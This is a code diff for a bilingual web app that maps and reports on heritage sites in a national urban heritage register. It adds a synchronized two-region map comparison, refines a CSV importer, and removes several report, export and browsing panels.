+  const regCount={}; DB.sites.forEach(s=>regCount[s[4]]=(regCount[s[4]]||0)+1);
+  const regOrder=Object.keys(regCount).map(Number).sort((a,b)=>regCount[b]-regCount[a]);
+  const selA=$('stDualSelA'), selB=$('stDualSelB');
+  if(!selA.options.length){
+    const opts=regOrder.map(ri=>`<option value="${ri}">${DB.regions[ri]} (${num(regCount[ri])})</option>`).join('');
+    selA.innerHTML=opts; selB.innerHTML=opts;
+    selA.value=regOrder[0]; selB.value=regOrder[1];
+    selA.onchange=()=>loadDualSide(0);
+    selB.onchange=()=>loadDualSide(1);
+  }
+  if(!_dualMaps){
+    const mkMap=div=>{
+      const m2=new AtlasMap(div,{center:[24,45],zoom:5.4,minZoom:4,maxZoom:17});
+      const dark=document.body.dataset.theme==='dark';
+      m2.setTiles((dark&&baseKey==='streets')?[DARK_TILE]:TILES[baseKey].base,'');
+      m2.setBorder(SA_BORDER);
+      return m2;
+    };
+    _dualMaps=[mkMap($('stDualA')),mkMap($('stDualB'))];
+  }
+  _dualMaps.forEach(m2=>m2._resize());
+  loadDualSide(0); loadDualSide(1);
+  // sync loop
+  let last=[null,null];
+  const key=m2=>m2.center[0].toFixed(5)+','+m2.center[1].toFixed(5)+','+m2.z.toFixed(3);
+  last=[key(_dualMaps[0]),key(_dualMaps[1])];
+  _dualSync=setInterval(()=>{
+    if(!_dualMaps)return;
+    const kA=key(_dualMaps[0]), kB=key(_dualMaps[1]);
+    if(kA!==last[0]){ _dualMaps[1].setView([..._dualMaps[0].center],_dualMaps[0].z); last=[kA,key(_dualMaps[1])]; }
+    else if(kB!==last[1]){ _dualMaps[0].setView([..._dualMaps[1].center],_dualMaps[1].z); last=[key(_dualMaps[0]),kB]; }
+  },120);
+}
+function loadDualSide(side){
+  if(!_dualMaps)return;
+  const ri=+($(side===0?'stDualSelA':'stDualSelB').value);
+  const m2=_dualMaps[side];
+  const pts=[];
+  let s0=99,w=999,n0=-99,e0=-999;
+  for(let i=0;i<DB.sites.length;i++){
+    const s=DB.sites[i];
+    if(s[4]!==ri)continue;
+    pts.push({lat:s[2],lng:s[3],color:clsColor(s[6]),zone:DB.types[s[7]]==='منطقة',data:{idx:i,lat:s[2],lng:s[3]}});
+    s0=Math.min(s0,s[2]);n0=Math.max(n0,s[2]);w=Math.min(w,s[3]);e0=Math.max(e0,s[3]);
+  }
+  m2.setPoints(pts);
+  $(side===0?'stDualStatA':'stDualStatB').textContent=num(pts.length)+' '+L('موقع','sites');
+  if(pts.length&&side===0) m2.fitBounds([[s0,w],[n0,e0]],0.15);
+}
+function closeDual(){
+  $('stDual').classList.remove('show');
+  if(_dualSync){ clearInterval(_dualSync); _dualSync=null; }
+}
+
+/* ============================================================
+   KEPT: SMART CSV IMPORTER
    ============================================================ */
 function parseCSV(text){
   const rows=[]; let row=[],cell='',inQ=false;
@@ -5652,13 +6083,13 @@ const FIELD_ALIASES={
  cls:['class','fclass','الفئة','فئة'],
 };
 function detectCol(headers,aliases){
-  const norm=h=>String(h||'').trim().toLowerCase();
-  for(let i=0;i<headers.length;i++){ const h=norm(headers[i]); if(aliases.some(a=>h===a.toLowerCase())) return i; }
-  for(let i=0;i<headers.length;i++){ const h=norm(headers[i]); if(aliases.some(a=>h.includes(a.toLowerCase()))) return i; }
+  const norm2=h=>String(h||'').trim().toLowerCase();
+  for(let i=0;i<headers.length;i++){ const h=norm2(headers[i]); if(aliases.some(a=>h===a.toLowerCase())) return i; }
+  for(let i=0;i<headers.length;i++){ const h=norm2(headers[i]); if(aliases.some(a=>h.includes(a.toLowerCase()))) return i; }
   return -1;
 }
 function openImport(){
-  const b=dcOpen(L('استيراد ذكي','Smart importer'),L('ارفع ملف CSV — سيتم التعرف على الأعمدة تلقائياً ودمج المواقع الجديدة','Upload a CSV — columns are auto-detected and new sites merged'));
+  const b=dcOpen(L('الاستيراد الذكي','Smart importer'),L('ارفع ملف CSV — سيتم التعرف على الأعمدة تلقائياً ودمج المواقع الجديدة','Upload a CSV — columns are auto-detected and new sites merged'));
   b.innerHTML=`<div class="dc-drop" id="dcDrop">
       <svg viewBox="0 0 24 24" width="30" height="30" fill="none" stroke="currentColor" stroke-width="1.6"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4M7 10l5 5 5-5M12 15V3"/></svg>
       <b>${L('اسحب ملف CSV هنا أو اضغط للاختيار','Drag a CSV file here or click to choose')}</b>
@@ -5717,8 +6148,7 @@ function confirmImport(rows){
   let added=0;
   for(const p of rows){
     const code=nextUserCode();
-    let reg=DB.regions.findIndex ? Array.prototype.indexOf.call(DB.regions,p.region) : -1;
-    if(reg<0 && p.region){ try{ DB.regions.push?DB.regions.push(p.region):null; }catch(e){} reg=Math.max(0,reg); }
+    let reg=p.region?Array.prototype.indexOf.call(DB.regions,p.region):-1;
     reg=reg<0?0:reg;
     let gov=p.gov?Array.prototype.indexOf.call(DB.govs,p.gov):-1;
     if(p.gov&&gov<0){ try{ DB.govs.push(p.gov); gov=DB.govs.length-1; }catch(e){ gov=0; } }
@@ -5737,7 +6167,7 @@ function confirmImport(rows){
 }
 
 /* ============================================================
-   6) TIME MACHINE — stat snapshots
+   KEPT: TIME MACHINE (stat snapshots)
    ============================================================ */
 const SNAP_KEY='heritage_snapshots_v1';
 function snapList(){ try{ return JSON.parse(localStorage.getItem(SNAP_KEY)||'[]'); }catch(e){ return []; } }
@@ -5775,399 +6205,89 @@ function openTimeMachine(){
   };
 }
 
-/* ============================================================
-   7) EDIT PROTECTION (local passphrase lock)
-   ============================================================ */
-const LOCK_KEY='heritage_lock_v1';
-function lockHash(pin){ let h=0; for(let i=0;i<pin.length;i++){ h=(h*31+pin.charCodeAt(i))>>>0; } return String(h); }
-function isLocked(){ return !!localStorage.getItem(LOCK_KEY); }
-function openLock(){
-  const b=dcOpen(L('حماية التعديل','Edit protection'),L('قفل محلي بسيط لمنع التعديل العرضي على هذا الجهاز — ليس تشفيراً أمنياً','A simple local guard against accidental edits on this device — not real security'));
-  if(isLocked()){
-    b.innerHTML=`<div class="xh-note">${L('التعديل مقفل حالياً على هذا الجهاز.','Editing is currently locked on this device.')}</div>
-      <div class="xh-inrow"><input class="xh-in" id="dcUnlockPin" type="password" placeholder="${L('كلمة المرور','Passphrase')}">
-      <button class="xh-btn" id="dcUnlockBtn">${L('فتح القفل','Unlock')}</button></div>`;
-    $('dcUnlockBtn').onclick=()=>{
-      const pin=$('dcUnlockPin').value;
-      if(lockHash(pin)===localStorage.getItem(LOCK_KEY)){ localStorage.removeItem(LOCK_KEY); toast(L('✓ تم فتح القفل','✓ Unlocked')); dcClose(); }
-      else toast(L('كلمة مرور خاطئة','Wrong passphrase'));
-    };
-  } else {
-    b.innerHTML=`<div class="xh-note">${L('عند التفعيل، ستحتاج لإدخال كلمة المرور قبل إضافة مواقع أو استيراد بيانات على هذا الجهاز.','Once enabled, you will need the passphrase before adding sites or importing data on this device.')}</div>
-      <div class="xh-inrow"><input class="xh-in" id="dcLockPin" type="password" placeholder="${L('اختر كلمة مرور','Choose a passphrase')}">
-      <button class="xh-btn" id="dcLockBtn">${L('تفعيل القفل','Enable lock')}</button></div>`;
-    $('dcLockBtn').onclick=()=>{
-      const pin=$('dcLockPin').value;
-      if(pin.length<3){ toast(L('اكتب ٣ أحرف على الأقل','Use at least 3 characters')); return; }
-      localStorage.setItem(LOCK_KEY,lockHash(pin));
-      toast(L('✓ تم تفعيل القفل','✓ Lock enabled')); dcClose();
-    };
-  }
-}
-function guardEdit(actionFn){
-  if(!isLocked()){ actionFn(); return; }
-  const pin=prompt(L('أدخل كلمة مرور التعديل:','Enter the edit passphrase:'));
-  if(pin!=null && lockHash(pin)===localStorage.getItem(LOCK_KEY)) actionFn();
-  else if(pin!=null) toast(L('كلمة مرور خاطئة','Wrong passphrase'));
-}
-try{
-  const _addBtn=$('addSiteBtn');
-  if(_addBtn){ const _orig=_addBtn.onclick; _addBtn.onclick=()=>guardEdit(()=>_orig&&_orig()); }
-}catch(e){}
-
-/* ============================================================
-   8) VIEW AS JSON (local "API")
-   ============================================================ */
-function openApiView(){
-  const b=dcOpen(L('عرض كـ JSON','View as JSON'),L('نسخة من البيانات المُصفّاة الحالية بصيغة JSON منظمة — للاستخدام في أنظمة أو أدوات أخرى','A shaped JSON snapshot of the current filter — for other systems/tools'));
-  const vis=DB.sites.filter(passes).slice(0,5000).map(s=>({
-    code:s[0], name:siteName(s), lat:s[2], lng:s[3], region:DB.regions[s[4]], governorate:DB.govs[s[5]],
-    class:clsLbl(s), type:DB.types[s[7]]==='منطقة'?'zone':'building',
-    heritage:herLabel?herLabel(s):DB.heritage[s[8]], age:s[9], decay_pct:s[10]!=null?Math.round(s[10]*100):null,
-    risk:riskScore(s)
-  }));
-  const json=JSON.stringify({generated_at:new Date().toISOString(), count:vis.length, sites:vis},null,2);
-  b.innerHTML=`<div class="xh-kpirow"><div class="xh-kpi"><b>${num(vis.length)}</b><span>${L('موقع في هذه اللقطة','sites in this snapshot')}</span></div></div>
-    <textarea class="dc-json" readonly>${json.slice(0,20000)}${json.length>20000?'\n… ('+L('مقتطف — نزّل الملف للنسخة الكاملة','truncated — download for full file')+')':''}</textarea>
-    <div class="xh-actionrow" style="margin-top:10px">
-      <button class="xh-btn" id="dcJsonDl">⬇ ${L('تنزيل JSON','Download JSON')}</button>
-      <button class="xh-btn ghost" id="dcJsonCopy">📋 ${L('نسخ','Copy')}</button></div>`;
-  $('dcJsonDl').onclick=()=>{ const a=document.createElement('a'); a.href=URL.createObjectURL(new Blob([json],{type:'application/json'})); a.download='heritage_sites_api.json'; a.click(); };
-  $('dcJsonCopy').onclick=()=>{ navigator.clipboard?.writeText(json); toast(L('تم النسخ','Copied')); };
-}
-
-/* ============================================================
-   9) ENVIRONMENTAL RISK (elevation-based proxy, offline)
-   ============================================================ */
-function envRisk(s,idx){
-  const ex=DB.siteExtra&&DB.siteExtra[idx];
-  const elev=ex?ex[2]:null;
-  let floodRisk = elev==null?0.3: elev<50?0.75: elev<200?0.4: 0.15;
-  const heatRisk = (s[4]!=null && [4,5,11,12].includes(s[4])) ? 0.7 : 0.4; // Eastern/Najran/Jazan-ish higher heat proxy by region idx pattern (approx)
-  return Math.round((floodRisk*0.6+heatRisk*0.4)*100);
-}
-function openEnvRisk(){
-  const b=dcOpen(L('مؤشّر المخاطر البيئية التقديري','Estimated environmental risk'),L('تقدير تقريبي من الارتفاع والموقع الجغرافي (بدون اتصال بخدمات خارجية) — وليس بيانات رصد جوي حقيقية','Approximate estimate from elevation & location (fully offline) — not real weather data'));
-  const vis=[];
-  for(let i=0;i<DB.sites.length;i++){ const s=DB.sites[i]; if(!passes(s))continue; vis.push({s,i,r:envRisk(s,i)}); }
-  vis.sort((a,b)=>b.r-a.r);
-  const top=vis.slice(0,15);
-  const avg=vis.length?Math.round(vis.reduce((a,x)=>a+x.r,0)/vis.length):0;
-  b.innerHTML=`<div class="xh-kpirow"><div class="xh-kpi"><b>${num(avg)}</b><span>${L('متوسط المؤشر (٠-١٠٠)','avg index (0-100)')}</span></div></div>
-    <h4 class="xh-h4">${L('الأعلى عرضة تقديرياً','Highest estimated exposure')}</h4>
-    <div class="xh-rows">${top.map((o,k)=>`<div class="xh-row" data-goto="${o.i}"><span class="xh-rank">${num(k+1)}</span>
-      <div class="xh-rowmain"><b>${siteName(o.s)}</b><span class="xh-soft">${DB.govs[o.s[5]]}</span></div>
-      <span class="xh-tag" style="background:${o.r>=60?'#bd343b22':'#f59e4122'};color:${o.r>=60?'#bd343b':'#f59e41'}">${num(o.r)}</span></div>`).join('')}</div>`;
-  b.querySelectorAll('[data-goto]').forEach(x=>x.onclick=()=>{ dcClose(); setView('map'); gotoSite(+x.dataset.goto); });
-}
-
-/* ============================================================
-   10) ARCHITECTURAL STYLE ENCYCLOPEDIA
-   ============================================================ */
-function openStyles(){
-  const b=dcOpen(L('موسوعة الطرز المعمارية','Architectural style encyclopedia'),L('الطرز المسجّلة في السجل الحالي مع عدد المواقع','Styles present in the register, with site counts'));
-  const byStyle={};
-  for(const s of DB.sites){ const si=s[17]; if(si==null||si<0) continue; const name=DB.dict[si]; if(!name) continue; byStyle[name]=(byStyle[name]||0)+1; }
-  const ranked=Object.entries(byStyle).sort((a,b)=>b[1]-a[1]).slice(0,30);
-  b.innerHTML=`<div class="xh-rows">${ranked.map(([name,n])=>`<div class="xh-row" data-style="${name}"><div class="xh-rowmain"><b>${dvSafe(name)}</b></div><span class="xh-tag" style="background:var(--panel-2)">${num(n)}</span></div>`).join('')||`<div class="xh-note">${L('لا بيانات طراز مسجّلة','No style data recorded')}</div>`}</div>
-    <div class="xh-note">${L('اضغط أي طراز لعرض مواقعه على الخريطة.','Click a style to view its sites on the map.')}</div>`;
-  b.querySelectorAll('[data-style]').forEach(row=>row.onclick=()=>{
-    const name=row.dataset.style;
-    const di=DB.dict.indexOf(name); if(di<0) return;
-    dcClose(); setView('map');
-    let s0=99,w=999,n0=-99,e0=-999,c=0;
-    for(const s of DB.sites){ if(s[17]!==di) continue; c++; s0=Math.min(s0,s[2]);n0=Math.max(n0,s[2]);w=Math.min(w,s[3]);e0=Math.max(e0,s[3]); }
-    if(c) map.fitBounds([[s0,w],[n0,e0]],0.2);
-    toast(L(`${num(c)} موقع بطراز "${dvSafe(name)}"`,`${num(c)} sites with "${dvSafe(name)}" style`));
-  });
-}
-
-/* ============================================================
-   11) HISTORICAL ERAS (age-bucket browse)
-   ============================================================ */
-const ERAS=[
- {key:'e1',min:250,max:9999,ar:'أكثر من ٢٥٠ سنة',en:'250+ years'},
- {key:'e2',min:150,max:249, ar:'١٥٠ – ٢٤٩ سنة',en:'150–249 years'},
- {key:'e3',min:100,max:149, ar:'١٠٠ – ١٤٩ سنة',en:'100–149 years'},
- {key:'e4',min:50, max:99,  ar:'٥٠ – ٩٩ سنة',en:'50–99 years'},
- {key:'e5',min:0,  max:49,  ar:'أقل من ٥٠ سنة',en:'Under 50 years'},
-];
-function openEras(){
-  const b=dcOpen(L('العصور التاريخية (تقديرية)','Historical eras (approximate)'),L('تصنيف حسب العمر التقريبي المسجّل — وليس تأريخاً أثرياً معتمداً','Grouped by recorded approximate age — not a certified archaeological dating'));
-  const counts=ERAS.map(e=>{ let n=0; for(const s of DB.sites){ if(s[9]!=null&&s[9]>=e.min&&s[9]<=e.max) n++; } return n; });
-  const max=Math.max(...counts,1);
-  b.innerHTML=`<div class="xh-rows">${ERAS.map((e,i)=>`<div class="xh-row" data-era="${i}" style="cursor:pointer">
-      <div class="xh-rowmain"><b>${L(e.ar,e.en)}</b></div>
-      <div class="xh-track" style="flex:2"><div class="xh-fill" style="width:${(counts[i]/max*100).toFixed(0)}%;background:var(--accent)"></div></div>
-      <span class="xh-tag" style="background:var(--panel-2)">${num(counts[i])}</span></div>`).join('')}</div>`;
-  b.querySelectorAll('[data-era]').forEach(row=>row.onclick=()=>{
-    const e=ERAS[+row.dataset.era];
-    dcClose(); setView('map');
-    _dcQueryFilter = s=>s[9]!=null && s[9]>=e.min && (e.max>=9999 || s[9]<=e.max); render();
-    toast(L(`عرض مواقع ${e.ar} فأكثر`,`Showing sites ${e.en}+`));
-  });
-}
-
-/* ============================================================
-   12) EXECUTIVE ONE-PAGER
-   ============================================================ */
-function openExec(){
-  const vis=DB.sites.filter(passes);
-  let dSum=0,dN=0,urg=0; const byReg={};
-  for(const s of vis){ if(s[10]!=null){dSum+=s[10];dN++;if(s[10]>=0.5)urg++;} byReg[s[4]]=(byReg[s[4]]||0)+1; }
-  const avgDecay=dN?Math.round(dSum/dN*100):0;
-  const topRisk=vis.map(s=>({s,r:riskScore(s)})).sort((a,b)=>b.r-a.r).slice(0,3);
-  const nReg=Object.keys(byReg).length;
-  const today=new Date().toLocaleDateString(LANG==='ar'?'ar-SA':'en-GB');
-  $('pdfReport').innerHTML=`<div class="pdfr-inner dc-exec">
-    <div class="pdfr-head">${window.HC_LOGO?`<img src="${window.HC_LOGO}" alt="">`:'<span></span>'}
-      <div class="pdfr-title"><h1>${t('reg_name')}</h1><p>${L('لوحة القيادة التنفيذية','Executive Overview')} — ${today}</p></div></div>
-    <div class="dc-exec-kpis">
-      <div class="dc-exec-kpi"><b>${num(vis.length)}</b><span>${L('إجمالي الأصول','Total assets')}</span></div>
-      <div class="dc-exec-kpi"><b>${num(avgDecay)}٪</b><span>${L('متوسط التهدّم','Avg deterioration')}</span></div>
-      <div class="dc-exec-kpi" style="color:#bd343b"><b>${num(urg)}</b><span>${L('ملحّة للترميم','Urgent restoration')}</span></div>
-      <div class="dc-exec-kpi"><b>${num(nReg)}</b><span>${L('مناطق مشمولة','Regions covered')}</span></div>
-    </div>
-    <h2 style="font-size:15px;color:#113241;margin:26px 0 12px">${L('أعلى ٣ مواقع أولوية','Top 3 priority sites')}</h2>
-    ${topRisk.map((o,i)=>`<div class="dc-exec-risk"><b>${num(i+1)}. ${siteName(o.s)}</b><span>${DB.govs[o.s[5]]} · ${L('مؤشّر مخاطر','risk index')} ${num(o.r)}</span></div>`).join('')}
-    <div class="pdfr-foot">${L('وثيقة صادرة عن السجل الوطني للتراث العمراني','National Urban Heritage Register document')}</div>
-  </div>`;
-  document.body.classList.add('printing-report');
-  setTimeout(()=>{ window.print(); setTimeout(()=>document.body.classList.remove('printing-report'),400); },250);
-}
-
-/* ============================================================
-   13) SLIDE-DECK GENERATOR
-   ============================================================ */
-function openDeck(){
-  const vis=DB.sites.filter(passes);
-  if(!vis.length){ toast(L('لا توجد مواقع ضمن الفلتر الحالي','No sites in current filter')); return; }
-  const top=vis.map((s,i)=>({s,r:riskScore(s)})).sort((a,b)=>b.r-a.r).slice(0,5);
-  const today=new Date().toLocaleDateString(LANG==='ar'?'ar-SA':'en-GB');
-  const slides=[];
-  slides.push(`<section class="dks"><h1>${t('reg_name')}</h1><p>${L('عرض تقديمي','Presentation')} — ${today}</p><p class="dks-n">${num(vis.length)} ${L('أصل تراثي','heritage assets')}</p></section>`);
-  slides.push(`<section class="dks"><h2>${L('نظرة عامة','Overview')}</h2><div class="dks-kpis">
-    <div><b>${num(vis.length)}</b><span>${L('إجمالي','Total')}</span></div>
-    <div><b>${num(new Set(vis.map(s=>s[4])).size)}</b><span>${L('مناطق','Regions')}</span></div>
-    <div><b>${num(vis.filter(s=>s[10]!=null&&s[10]>=0.5).length)}</b><span>${L('ملحّة','Urgent')}</span></div></div></section>`);
-  top.forEach((o,i)=>{
-    const cov=(typeof siteCover==='function')?siteCover(o.s[0]):null;
-    slides.push(`<section class="dks" ${cov?`style="background-image:linear-gradient(rgba(17,50,65,.75),rgba(17,50,65,.75)),url('${cov}');background-size:cover;color:#fff"`:''}>
-      <h2>${L('موقع','Site')} ${num(i+1)}</h2><h3>${siteName(o.s)}</h3><p>${DB.govs[o.s[5]]} · ${DB.regions[o.s[4]]}</p>
-      <p>${L('مؤشّر المخاطر','Risk index')}: <b>${num(o.r)}</b>${o.s[10]!=null?' · '+L('تهدّم','Decay')+': '+num(Math.round(o.s[10]*100))+'٪':''}</p></section>`);
-  });
-  slides.push(`<section class="dks"><h2>${L('شكراً','Thank you')}</h2><p>${t('reg_name')}</p></section>`);
-  const win=window.open('','_blank');
-  if(!win){ toast(L('يرجى السماح بالنوافذ المنبثقة','Please allow pop-ups')); return; }
-  win.document.write(`<!doctype html><html dir="${LANG==='ar'?'rtl':'ltr'}"><head><meta charset="utf-8"><title>${t('reg_name')}</title>
-    <style>
-      body{margin:0;font-family:'IBM Plex Sans Arabic',system-ui,sans-serif;background:#0d1d24;overflow:hidden}
-      .dks{width:100vw;height:100vh;display:none;flex-direction:column;align-items:center;justify-content:center;text-align:center;
-        color:#fff;background:linear-gradient(135deg,#113241,#1c4a5c);padding:40px;box-sizing:border-box}
-      .dks.on{display:flex}
-      .dks h1{font-size:44px;margin:0 0 10px}
-      .dks h2{font-size:16px;letter-spacing:2px;text-transform:uppercase;opacity:.7;margin:0 0 14px}
-      .dks h3{font-size:38px;margin:0 0 14px}
-      .dks p{font-size:18px;opacity:.9;margin:4px 0}
-      .dks-n{font-size:26px!important;font-weight:700;color:#f0c090}
-      .dks-kpis{display:flex;gap:40px;margin-top:16px}
-      .dks-kpis div{text-align:center}
-      .dks-kpis b{display:block;font-size:36px}
-      .dks-kpis span{font-size:13px;opacity:.7}
-      .dknav{position:fixed;bottom:20px;left:50%;transform:translateX(-50%);color:#fff;opacity:.6;font-size:13px;z-index:10}
-    </style></head><body>
-    ${slides.map((s,i)=>s.replace('class="dks"','class="dks'+(i===0?' on':'')+'"')).join('')}
-    <div class="dknav">← → &nbsp;|&nbsp; <span id="dkc">1</span> / ${slides.length}</div>
-    <scr${''}ipt>
-      let i=0; const s=[...document.querySelectorAll('.dks')];
-      function go(n){ s[i].classList.remove('on'); i=(n+s.length)%s.length; s[i].classList.add('on'); document.getElementById('dkc').textContent=i+1; }
-      document.addEventListener('keydown',e=>{ if(e.key==='ArrowRight')go(i+(${LANG==='ar'?-1:1})); if(e.key==='ArrowLeft')go(i-(${LANG==='ar'?-1:1})); });
-      document.addEventListener('click',()=>go(i+1));
-    <${''}/script></body></html>`);
-  win.document.close();
-}
-
-/* ============================================================
-   14) GOVERNORATE-LEVEL ATLAS
-   ============================================================ */
-function openGovAtlas(){
-  const b=dcOpen(L('أطلس المحافظات','Governorate atlas'),L('اختر محافظة لطباعة تقرير مخصص لها','Pick a governorate to print a dedicated report'));
-  const counts={}; DB.sites.forEach(s=>counts[s[5]]=(counts[s[5]]||0)+1);
-  const order=Object.keys(counts).map(Number).sort((a,b)=>counts[b]-counts[a]);
-  b.innerHTML=`<div class="xh-rows">${order.map(gi=>`<div class="xh-row" data-gi="${gi}" style="cursor:pointer"><div class="xh-rowmain"><b>${DB.govs[gi]}</b></div><span class="xh-tag" style="background:var(--panel-2)">${num(counts[gi])}</span></div>`).join('')}</div>`;
-  b.querySelectorAll('[data-gi]').forEach(row=>row.onclick=()=>buildGovReport(+row.dataset.gi));
-}
-function buildGovReport(gi){
-  const sites=DB.sites.filter(s=>s[5]===gi);
-  let dSum=0,dN=0,urg=0; const byCls={};
-  for(const s of sites){ if(s[10]!=null){dSum+=s[10];dN++;if(s[10]>=0.5)urg++;} byCls[s[6]]=(byCls[s[6]]||0)+1; }
-  const topRisk=sites.map(s=>({s,r:riskScore(s)})).sort((a,b)=>b.r-a.r).slice(0,10);
-  const today=new Date().toLocaleDateString(LANG==='ar'?'ar-SA':'en-GB');
-  const clsRows=DB.classes.map((c,i)=>byCls[i]?`<div class="rp-cls"><span class="rp-cdot" style="background:${CLASS_META[c]?CLASS_META[c].color:'#999'}"></span>${CLASS_META[c]?(LANG==='ar'?CLASS_META[c].ar:CLASS_META[c].en):c}: <b>${num(byCls[i])}</b></div>`:'').join('');
-  const riskRows=topRisk.map((o,i)=>{const rc=riskColor(o.r);return `<tr><td>${num(i+1)}</td><td>${siteName(o.s)}</td><td style="text-align:center;color:${rc};font-weight:700">${num(o.r)}</td><td style="text-align:center">${o.s[10]!=null?num(Math.round(o.s[10]*100))+'٪':'—'}</td></tr>`;}).join('');
-  $('pdfReport').innerHTML=`<div class="pdfr-inner">
-    <div class="pdfr-head">${window.HC_LOGO?`<img src="${window.HC_LOGO}" alt="">`:'<span></span>'}
-      <div class="pdfr-title"><h1>${t('reg_name')}</h1><p>${L('تقرير محافظة','Governorate Profile')}: ${DB.govs[gi]} — ${today}</p></div></div>
-    <div class="pdfr-meta">
-      <div class="pdfr-kpi"><b>${num(sites.length)}</b><span>${L('إجمالي الأصول','Total assets')}</span></div>
-      <div class="pdfr-kpi"><b>${num(dN?Math.round(dSum/dN*100):0)}٪</b><span>${L('متوسط التهدّم','Avg deterioration')}</span></div>
-      <div class="pdfr-kpi"><b>${num(urg)}</b><span>${L('ملحّة للترميم','Urgent')}</span></div>
-    </div>
-    <div style="margin:16px 0">${clsRows}</div>
-    <h3 style="font-size:14px;color:#113241;margin-bottom:12px">${L('أعلى ١٠ مواقع خطورة','Top 10 by risk')}</h3>
-    <table class="pdfr-table"><thead><tr><th>#</th><th>${t('lh_name')}</th><th style="text-align:center">${L('المخاطر','Risk')}</th><th style="text-align:center">${t('lh_decay')}</th></tr></thead><tbody>${riskRows}</tbody></table>
-    <div class="pdfr-foot">${L('وثيقة صادرة عن السجل الوطني للتراث العمراني','National Urban Heritage Register document')}</div></div>`;
-  dcClose();
-  document.body.classList.add('printing-report');
-  setTimeout(()=>{ window.print(); setTimeout(()=>document.body.classList.remove('printing-report'),400); },250);
-}
-
-/* ============================================================
-   15) NEGLECTED SITES
-   ============================================================ */
-function openNeglect(){
-  const b=dcOpen(L('المواقع المهملة','Neglected sites'),L('الأقل اكتمالاً في البيانات وبدون توثيق أو تعديل مسجّل مؤخراً','Least complete data, with no recently recorded documentation'));
-  let auditCodes=new Set();
-  try{ (JSON.parse(localStorage.getItem('heritage_audit_v1')||'[]')).forEach(e=>{ const m=String(e.d||'').match(/(\d{4,6})/); if(m)auditCodes.add(m[1]); }); }catch(e){}
-  const scored=[];
-  for(let i=0;i<DB.sites.length;i++){
-    const s=DB.sites[i];
-    if(!passes(s)) continue;
-    let missing=0;
-    if(s[10]==null)missing++; if(s[9]==null)missing++; if(s[11]==null)missing++;
-    if(s[13]==null||s[13]<0)missing++; if(s[15]==null||s[15]<0)missing++;
-    if(!s[16]||!s[16].length)missing++;
-    const touched=auditCodes.has(String(s[0]));
-    const score=missing*15+(touched?0:10);
-    if(score>0) scored.push({i,score,missing});
-  }
-  scored.sort((a,b)=>b.score-a.score);
-  const top=scored.slice(0,20);
-  b.innerHTML=`<div class="xh-kpirow"><div class="xh-kpi"><b>${num(scored.length)}</b><span>${L('موقع بحاجة لمتابعة','sites needing follow-up')}</span></div></div>
-    <div class="xh-rows">${top.map((o,k)=>{const s=DB.sites[o.i];return `<div class="xh-row" data-goto="${o.i}"><span class="xh-rank">${num(k+1)}</span>
-      <div class="xh-rowmain"><b>${siteName(s)}</b><span class="xh-soft">${DB.govs[s[5]]}</span></div>
-      <span class="xh-tag" style="background:var(--panel-2)">${num(o.missing)} ${L('حقول ناقصة','missing fields')}</span></div>`;}).join('')||`<div class="xh-note">${L('السجل مكتمل جيداً ضمن الفلتر الحالي','Data looks well-completed for the current filter')}</div>`}</div>`;
-  b.querySelectorAll('[data-goto]').forEach(x=>x.onclick=()=>{ dcClose(); setView('map'); gotoSite(+x.dataset.goto); });
-}
-
-/* ============================================================
-   16) HISTORICAL SATELLITE IMAGERY (link-out)
-   ============================================================ */
-function openSatellite(){
-  const b=dcOpen(L('صور تاريخية عبر الأقمار الصناعية','Historical satellite imagery'),L('يفتح أرشيف الصور التاريخية لموقع محدد في نافذة خارجية','Opens the historical imagery archive for a chosen site in a new tab'));
-  b.innerHTML=`<div class="xh-note">${L('اختر موقعاً من القائمة أو ابحث، ثم اضغط لفتح الأرشيف التاريخي لمكانه.','Pick a site below, or search, then open its historical archive.')}</div>
-    <input class="xh-in" id="dcSatSearch" placeholder="${L('ابحث باسم الموقع…','Search by site name…')}" style="margin:10px 0">
-    <div class="xh-rows" id="dcSatList"></div>`;
-  const render2=q=>{
-    const ql=(q||'').trim();
-    const hits=[];
-    for(let i=0;i<DB.sites.length && hits.length<12;i++){ const s=DB.sites[i]; if(!ql||s[1].includes(ql)||siteName(s).toLowerCase().includes(ql.toLowerCase())) hits.push([s,i]); }
-    $('dcSatList').innerHTML=hits.map(([s,i])=>`<div class="xh-row" data-sat="${i}" style="cursor:pointer"><div class="xh-rowmain"><b>${siteName(s)}</b><span class="xh-soft">${DB.govs[s[5]]}</span></div><span class="xh-soft">🛰</span></div>`).join('')||`<div class="xh-note">${L('لا نتائج','No results')}</div>`;
-    $('dcSatList').querySelectorAll('[data-sat]').forEach(row=>row.onclick=()=>{
-      const s=DB.sites[+row.dataset.sat];
-      window.open(`https://earth.google.com/web/@${s[2]},${s[3]},1000a,1000d,35y,0h,0t,0r`,'_blank');
-    });
-  };
-  render2('');
-  $('dcSatSearch').oninput=e=>render2(e.target.value);
-}
-
-/* ============================================================
-   17) ADVANCED MULTI-CONDITION QUERY BUILDER
-   ============================================================ */
-let dcQueryConds=[];
-function openQueryBuilder(){
-  const b=dcOpen(L('الاستعلام المتقدم','Advanced query builder'),L('اجمع أكثر من شرط في آن واحد لتصفية دقيقة','Combine multiple conditions for precise filtering'));
-  dcQueryConds=[{field:'decay',op:'>=',val:50}];
-  b.innerHTML=`<div id="dcQRows"></div>
-    <div class="xh-actionrow"><button class="xh-btn ghost" id="dcQAdd">+ ${L('إضافة شرط','Add condition')}</button>
-    <button class="xh-btn" id="dcQRun">${L('تطبيق','Apply')}</button>
-    <button class="xh-btn ghost" id="dcQReset">${L('إعادة ضبط','Reset')}</button></div>
-    <div class="xh-note" id="dcQResult"></div>`;
-  const FIELDS=[
-    {key:'decay',label:L('نسبة التهدّم %','Decay %')},{key:'age',label:L('العمر','Age')},
-    {key:'class',label:L('الفئة','Class')},{key:'region',label:L('المنطقة','Region')},
-  ];
-  function rowHTML(c,i){
-    const isNum=c.field==='decay'||c.field==='age';
-    let valInput;
-    if(c.field==='class') valInput=`<select class="dc-qval" data-i="${i}">${DB.classes.map((cl,ci)=>`<option value="${ci}" ${+c.val===ci?'selected':''}>${LANG==='ar'?cl:(CLASS_META[cl]?CLASS_META[cl].eshort:cl)}</option>`).join('')}</select>`;
-    else if(c.field==='region') valInput=`<select class="dc-qval" data-i="${i}">${DB.regions.map((r,ri)=>`<option value="${ri}" ${+c.val===ri?'selected':''}>${r}</option>`).join('')}</select>`;
-    else valInput=`<input class="dc-qval xh-in" data-i="${i}" type="number" value="${c.val}">`;
-    return `<div class="dc-qrow">
